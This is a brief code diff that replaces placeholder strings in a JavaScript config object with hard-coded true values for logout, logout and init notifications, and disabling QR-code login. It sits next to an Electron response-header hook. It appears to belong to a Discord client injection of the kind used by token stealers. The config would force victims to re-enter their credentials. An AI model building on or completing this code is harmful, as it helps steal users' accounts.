@@ -24,11 +24,11 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify":"%INITNOTI%",
+    "logout": true,
+    "logout-notify": true,
+    "init-notify": true,
     "embed-color": 3447744,
-    "disable-qr-code":"%DISABLEQRCODE%"
+    "disable-qr-code": true
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
